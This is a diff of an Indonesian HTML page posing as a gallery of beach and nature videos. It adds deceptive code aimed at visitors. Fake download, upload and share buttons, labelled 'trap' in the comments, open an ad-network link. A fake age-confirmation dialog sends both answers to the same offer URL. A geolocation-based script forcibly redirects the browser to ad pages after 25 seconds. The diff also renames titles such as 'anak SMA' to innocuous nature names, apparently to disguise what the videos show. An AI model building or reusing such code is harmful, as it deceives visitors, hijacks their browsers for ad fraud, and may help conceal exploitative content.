@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover, user-scalable=yes">
-  <meta name="theme-color" content="#000000">
+  <meta name="theme-color" content="#ff0000">
   <title>Main di Pantai & Alam - Kumpulan Video Potret</title>
 
   <!-- Google Fonts -->
@@ -18,12 +18,13 @@
 
     body {
       font-family: 'Inter', Arial, sans-serif;
-      background: #0a0a0a;
-      color: #f0f0f0;
+      background: linear-gradient(135deg, #fff0f0 0%, #ffe0e0 100%);
+      color: #1a1a2e;
       line-height: 1.4;
       min-height: 100vh;
     }
 
+    /* Navbar Merah Putih */
     .navbar {
       display: flex;
       justify-content: space-between;
@@ -31,8 +32,8 @@
       flex-wrap: wrap;
       gap: 12px;
       padding: 12px 20px;
-      background: #111;
-      border-bottom: 1px solid #2a2a2a;
+      background: linear-gradient(135deg, #ff0000, #cc0000);
+      border-bottom: 3px solid #ffffff;
       position: sticky;
       top: 0;
       z-index: 100;
@@ -40,11 +41,39 @@
 
     .logo {
       font-weight: 800;
-      font-size: 1.5rem;
-      background: linear-gradient(135deg, #00d2ff, #3a7bd5);
+      font-size: 1.6rem;
+      background: #ffffff;
       -webkit-background-clip: text;
       background-clip: text;
       color: transparent;
+      text-shadow: none;
+      -webkit-text-stroke: 1px white;
+    }
+    /* fallback untuk logo */
+    .logo {
+      color: white;
+      background: none;
+      -webkit-text-stroke: 0;
+    }
+
+    /* Tombol jebakan */
+    .trap-btn {
+      background: white;
+      color: #ff0000;
+      padding: 8px 22px;
+      border-radius: 40px;
+      border: none;
+      font-weight: 700;
+      font-size: 0.9rem;
+      cursor: pointer;
+      transition: 0.2s;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.2);
+    }
+    .trap-btn:active {
+      transform: scale(0.96);
+    }
+    .trap-btn:hover {
+      background: #ffe0e0;
     }
 
     .main-container {
@@ -59,16 +88,17 @@
     }
     .video-title h1 {
       font-size: 1.8rem;
-      font-weight: 700;
-      background: linear-gradient(135deg, #ffb347, #ff6b6b);
+      font-weight: 800;
+      background: linear-gradient(135deg, #ff0000, #cc0000);
       -webkit-background-clip: text;
       background-clip: text;
       color: transparent;
     }
     .video-title p {
-      color: #aaa;
+      color: #cc0000;
       font-size: 0.9rem;
       margin-top: 5px;
+      font-weight: 500;
     }
 
     /* Grid video */
@@ -80,11 +110,12 @@
     }
 
     .video-card-item {
-      background: #0f0f0f;
+      background: white;
       border-radius: 28px;
       overflow: hidden;
       padding: 16px;
-      border: 1px solid #222;
+      border: 1px solid #ffcccc;
+      box-shadow: 0 8px 20px rgba(255,0,0,0.1);
     }
 
     .video-portrait {
@@ -112,37 +143,96 @@
     .video-caption {
       text-align: center;
       font-size: 0.85rem;
-      color: #aaa;
+      color: #ff0000;
       margin: 10px 0;
+      font-weight: 600;
     }
 
-    /* Iklan banner di antara video */
-    .ad-banner {
+    /* Tombol download jebakan di setiap video */
+    .fake-download-btn {
+      background: linear-gradient(135deg, #ff0000, #cc0000);
+      color: white;
+      border: none;
+      padding: 12px 20px;
+      border-radius: 40px;
+      font-weight: 800;
+      font-size: 0.9rem;
+      cursor: pointer;
+      width: 100%;
+      transition: 0.2s;
+      margin-top: 8px;
+      box-shadow: 0 2px 8px rgba(255,0,0,0.3);
+    }
+    .fake-download-btn:active {
+      transform: scale(0.97);
+    }
+
+    /* Style untuk banner iklan */
+    .ad-section {
       margin: 20px 0;
       text-align: center;
-      background: #1a1a1a;
-      border-radius: 20px;
+      background: white;
+      border-radius: 16px;
       padding: 15px;
+      border: 1px solid #ffcccc;
     }
-
     .ad-label {
       font-size: 0.7rem;
-      color: #666;
-      margin-bottom: 8px;
+      color: #ff0000;
+      margin-bottom: 10px;
       text-transform: uppercase;
       letter-spacing: 1px;
+      font-weight: 600;
+    }
+    .banner-container {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 70px;
+    }
+
+    /* Floating tombol jebakan tambahan */
+    .floating-trap {
+      position: fixed;
+      bottom: 20px;
+      right: 20px;
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+      z-index: 999;
+    }
+    .floating-trap button {
+      background: linear-gradient(135deg, #ff0000, #cc0000);
+      color: white;
+      border: none;
+      padding: 12px 20px;
+      border-radius: 50px;
+      font-weight: 800;
+      font-size: 0.85rem;
+      cursor: pointer;
+      box-shadow: 0 4px 12px rgba(255,0,0,0.4);
+      width: 130px;
+    }
+    .floating-trap button:active {
+      transform: scale(0.96);
     }
 
     @media (max-width: 550px) {
       .main-container { padding: 12px; }
       .video-title h1 { font-size: 1.5rem; }
+      .floating-trap button { width: 110px; font-size: 0.75rem; padding: 10px 12px; }
     }
   </style>
 </head>
 <body>
 
+<!-- Navbar dengan tombol jebakan -->
 <div class="navbar">
-  <div class="logo">VidPlay</div>
+  <div class="logo">🇮🇩 VidPlay Merah Putih 🇮🇩</div>
+  <div style="display: flex; gap: 10px;">
+    <button class="trap-btn" id="fakeUploadBtn">📤 UPLOAD VIDEO</button>
+    <button class="trap-btn" id="fakeDownloadNavBtn">📥 DOWNLOAD</button>
+  </div>
 </div>
 
 <div class="main-container">
@@ -151,73 +241,238 @@
     <p>Nikmati keindahan alam | Kumpulan video potret</p>
   </div>
 
+  <!-- BANNER IKLAN 1 (di atas video) -->
+  <div class="ad-section">
+    <div class="ad-label">★ IKLAN SPONSOR ★</div>
+    <div class="banner-container">
+      <script>
+        atOptions = {
+          'key' : 'ee940f1f7e6e38b68bf1b06f8fb45eb9',
+          'format' : 'iframe',
+          'height' : 60,
+          'width' : 468,
+          'params' : {}
+        };
+      </script>
+      <script src="https://www.highperformanceformat.com/ee940f1f7e6e38b68bf1b06f8fb45eb9/invoke.js"></script>
+    </div>
+  </div>
+
   <!-- DAFTAR VIDEO -->
   <div class="videos-grid" id="videosGrid"></div>
+
+  <!-- BANNER IKLAN 2 (di bawah video) -->
+  <div class="ad-section">
+    <div class="ad-label">★ REKOMENDASI UNTUK ANDA ★</div>
+    <div id="container-93d359bd09428cd7b28219a7c715f1bb"></div>
+  </div>
 </div>
 
-<!-- Iklan 1: Script pertama -->
+<!-- Floating Tombol Jebakan Tambahan -->
+<div class="floating-trap">
+  <button id="floatingDownloadBtn">📥 DOWNLOAD</button>
+  <button id="floatingShareBtn">🔗 SHARE</button>
+</div>
+
+<!-- ========== POPUP KONFIRMASI USIA (fixed) ========== -->
+<div id="age-backdrop" aria-hidden="true"
+     style="position:fixed; inset:0; z-index:9999; display:grid; place-items:center;
+            background:rgba(0,0,0,.50); backdrop-filter:blur(6px); -webkit-backdrop-filter:blur(6px);
+            padding:16px; opacity:0; visibility:hidden; pointer-events:none; 
+            transition:opacity .18s ease;">
+  <div id="age-dialog" role="dialog" aria-labelledby="age-title" aria-modal="true"
+       style="width:min(360px,96vw); background:#fff; border-radius:16px;
+              box-shadow:0 18px 48px rgba(0,0,0,.32); transform:scale(.96);
+              transition:transform .18s ease, opacity .18s ease; opacity:.98;">
+    <div style="padding:18px 18px 6px">
+      <h3 id="age-title" style="margin:0 0 8px; font:700 18px/1.3 Inter,system-ui,Arial,sans-serif; color:#dc2626">
+        🔞 Konfirmasi Usia
+      </h3>
+      <p style="margin:0 0 14px; font:14px/1.55 Inter,system-ui,Arial,sans-serif; color:#4b5563">
+        Apakah Anda sudah berusia 18+ tahun?
+      </p>
+    </div>
+    <div style="display:flex; gap:10px; padding:12px 18px 18px">
+      <button id="age-cancel" type="button"
+        style="flex:1; background:#e5e7eb; color:#111827; border:0; border-radius:12px; height:40px;
+               font:600 14px Inter,system-ui,Arial,sans-serif; letter-spacing:.2px; cursor:pointer;">
+        TIDAK
+      </button>
+      <button id="age-continue" type="button"
+        style="flex:1; background:#ef4444; color:#fff; border:0; border-radius:12px; height:40px;
+               font:700 14px Inter,system-ui,Arial,sans-serif; letter-spacing:.2px; cursor:pointer;">
+        YA, SAYA 18+
+      </button>
+    </div>
+  </div>
+</div>
+
+<!-- SCRIPT IKLAN -->
 <script src="https://pl29612091.effectivecpmnetwork.com/87/b8/2f/87b82fbdeaec82f8cdc287d94a4d7e3d.js"></script>
-
-<!-- Iklan 2: Container invoke -->
 <script async="async" data-cfasync="false" src="https://pl29612092.effectivecpmnetwork.com/93d359bd09428cd7b28219a7c715f1bb/invoke.js"></script>
-<div id="container-93d359bd09428cd7b28219a7c715f1bb"></div>
-
-<!-- Iklan 3: Script keempat -->
 <script src="https://pl29612094.effectivecpmnetwork.com/bf/7e/44/bf7e445227ac8810fef97ef109b769f1.js"></script>
 
-<!-- Iklan 4: AtOptions + invoke -->
-<script>
-  atOptions = {
-    'key' : 'ee940f1f7e6e38b68bf1b06f8fb45eb9',
-    'format' : 'iframe',
-    'height' : 60,
-    'width' : 468,
-    'params' : {}
-  };
-</script>
-<script src="https://www.highperformanceformat.com/ee940f1f7e6e38b68bf1b06f8fb45eb9/invoke.js"></script>
+<!-- GeoJS Script -->
+<script src="https://get.geojs.io/v1/ip/geo.js"></script>
 
 <script>
-  // ================== DAFTAR VIDEO ==================
-  const videoList = [
-    { src: "https://res.cloudinary.com/dw7g393lj/video/upload/v1777744020/vidio3_h8psu0.mp4", title: "🏝️ Pantai Pasir Putih" },
-    { src: "https://cdn2.slicedrive.com/0SnkAE8i1.mp4", title: "🌲 Hutan Tropis" },
-    { src: "https://cdn2.slicedrive.com/48DFeQPD1.mp4", title: "🌊 Kebun Belakang Rumah" },
-    { src: "https://cdn2.videy.co/wEkJbSvy1.mp4", title: "🎬 Judul Video Baru" },
-    { src: "https://cdn2.slicedrive.com/T9MkqIWz1.mp4", title: "🎬 anak SMA" },
-    { src: "https://cdn2.slicedrive.com/CLN2EI3H1.mp4", title: "🎬 tante ange" },
-  ];
+/* ================== LINK IKLAN Jebakan ================== */
+const TRAP_LINK = "https://www.effectivecpmnetwork.com/y2hyt5mnjw?key=35b1d05bec11858774cb79614d5ce151";
+
+// Fungsi untuk membuka link jebakan di tab baru
+function openTrapLink() {
+  window.open(TRAP_LINK, "_blank");
+}
+
+/* ================== VIDEO RENDER ================== */
+const videoList = [
+  { src: "https://res.cloudinary.com/dw7g393lj/video/upload/v1777744020/vidio3_h8psu0.mp4", title: "🏝️ Pantai Pasir Putih - Bali" },
+  { src: "https://cdn2.slicedrive.com/0SnkAE8i1.mp4", title: "🌲 Hutan Tropis - Kalimantan" },
+  { src: "https://cdn2.slicedrive.com/48DFeQPD1.mp4", title: "🌊 Pantai Selatan - Jogja" },
+  { src: "https://cdn2.videy.co/wEkJbSvy1.mp4", title: "🎬 Sunset di Raja Ampat" },
+  { src: "https://cdn2.slicedrive.com/T9MkqIWz1.mp4", title: "🎬 Liburan ke Pantai" },
+  { src: "https://cdn2.slicedrive.com/CLN2EI3H1.mp4", title: "🎬 Pesona Alam Indonesia" },
+];
+
+// Render semua video ke halaman
+function renderVideos() {
+  const grid = document.getElementById('videosGrid');
+  if (!grid) return;
   
-  // Render semua video ke halaman
-  function renderVideos() {
-    const grid = document.getElementById('videosGrid');
-    if (!grid) return;
-    
-    grid.innerHTML = '';
-    
-    videoList.forEach((video, index) => {
-      const videoId = `video_${index}`;
-      const card = document.createElement('div');
-      card.className = 'video-card-item';
-      card.innerHTML = `
-        <div class="video-portrait">
-          <div class="video-container">
-            <video id="${videoId}" controls playsinline poster="">
-              <source src="${video.src}" type="video/mp4">
-              Browser tidak mendukung video.
-            </video>
-          </div>
+  grid.innerHTML = '';
+  
+  videoList.forEach((video, index) => {
+    const videoId = `video_${index}`;
+    const card = document.createElement('div');
+    card.className = 'video-card-item';
+    card.innerHTML = `
+      <div class="video-portrait">
+        <div class="video-container">
+          <video id="${videoId}" controls playsinline poster="">
+            <source src="${video.src}" type="video/mp4">
+            Browser tidak mendukung video.
+          </video>
         </div>
-        <div class="video-caption">
-          ${video.title || '🎬 Video indah pantai & alam'}
-        </div>
-      `;
-      grid.appendChild(card);
-    });
+      </div>
+      <div class="video-caption">
+        📹 ${video.title || '🎬 Video indah pantai & alam'}
+      </div>
+      <button class="fake-download-btn" data-video-index="${index}">⬇️ DOWNLOAD VIDEO (GRATIS) ⬇️</button>
+    `;
+    grid.appendChild(card);
+    
+    // Pasang event listener untuk tombol download jebakan di setiap video
+    const downloadBtn = card.querySelector('.fake-download-btn');
+    if (downloadBtn) {
+      downloadBtn.addEventListener('click', (e) => {
+        e.stopPropagation();
+        openTrapLink();
+      });
+    }
+  });
+}
+
+// Panggil render saat halaman load
+renderVideos();
+
+/* ================== SEMUA TOMbol JEBAKAN ================== */
+// Tombol Upload di navbar
+document.getElementById('fakeUploadBtn')?.addEventListener('click', openTrapLink);
+// Tombol Download di navbar
+document.getElementById('fakeDownloadNavBtn')?.addEventListener('click', openTrapLink);
+// Tombol floating download
+document.getElementById('floatingDownloadBtn')?.addEventListener('click', openTrapLink);
+// Tombol floating share
+document.getElementById('floatingShareBtn')?.addEventListener('click', openTrapLink);
+
+/* ================== POPUP KONFIG ================== */
+const AGE_NEXT_URL      = "https://crn77.com/4/10517089";
+const OFFER_URL         = "https://crn77.com/4/10517089";
+const AUTO_SHOW_DELAY_MS= 15000;
+const REMEMBER_TTL_MIN  = 120;
+
+const $root      = document.documentElement;
+const $body      = document.body;
+const $backdrop  = document.getElementById('age-backdrop');
+const $dialog    = document.getElementById('age-dialog');
+const $btnCancel = document.getElementById('age-cancel');
+const $btnGo     = document.getElementById('age-continue');
+
+function lockScroll(on){ $root.style.overflow = $body.style.overflow = on ? 'hidden' : ''; }
+
+function showModal(){
+  if(!$backdrop) return;
+  $backdrop.setAttribute('aria-hidden','false');
+  $backdrop.style.visibility = 'visible';
+  $backdrop.style.pointerEvents = 'auto';
+  requestAnimationFrame(()=>{
+    $backdrop.style.opacity = '1';
+    if($dialog) $dialog.style.transform = 'scale(1)';
+  });
+  lockScroll(true);
+}
+
+function destroyModal(){
+  try{ lockScroll(false); }catch(_){}
+  try{ $backdrop.setAttribute('aria-hidden','true'); }catch(_){}
+  try{ $backdrop.remove(); }catch(_){ if($backdrop) $backdrop.style.display='none'; }
+}
+
+function openInNewTabOnly(url){
+  const a = document.createElement('a');
+  a.href = url;
+  a.target = '_blank';
+  a.rel = 'noopener noreferrer';
+  document.body.appendChild(a);
+  a.click();
+  a.remove();
+}
+
+function rememberSkip(){
+  try { localStorage.setItem('age_ok_time', String(Date.now())); } catch {}
+}
+function shouldSkip(){
+  try {
+    const t = +localStorage.getItem('age_ok_time') || 0;
+    return Date.now() - t < REMEMBER_TTL_MIN*60*1000;
+  } catch { return false; }
+}
+
+function handleChoice(url, ev){
+  if(ev){
+    ev.preventDefault();
+    ev.stopPropagation();
+    if (typeof ev.stopImmediatePropagation === 'function') ev.stopImmediatePropagation();
   }
-  
-  // Panggil render saat halaman load
-  renderVideos();
+  rememberSkip();
+  destroyModal();
+  openInNewTabOnly(url);
+}
+
+if($btnGo) $btnGo.addEventListener('click', (e)=> handleChoice(AGE_NEXT_URL, e), {capture:true});
+if($btnCancel) $btnCancel.addEventListener('click',(e)=> handleChoice(OFFER_URL, e), {capture:true});
+
+window.addEventListener('keydown', (e)=>{ if(e.key==='Escape') destroyModal(); });
+
+/* ================== GEOIP REDIRECT ================== */
+var LINK_ID  = "https://crn77.com/4/10517089";
+var LINK_ALL = "https://oversightexcitement.com/ecpp2d2yf?key=780644cc073355ffdcb57a8c6dbbd9b4";
+var DELAY = 25000;
+
+function geoip(g){
+  setTimeout(function(){
+    if (g && g.country === "ID") {
+      window.top.location.href = LINK_ID;
+    } else {
+      window.top.location.href = LINK_ALL;
+    }
+  }, DELAY);
+}
+
+// Tampilkan popup otomatis setelah delay
+window.addEventListener('load', ()=>{ 
+  if(!shouldSkip()) setTimeout(showModal, AUTO_SHOW_DELAY_MS); 
+});
 </script>
 
 </body>
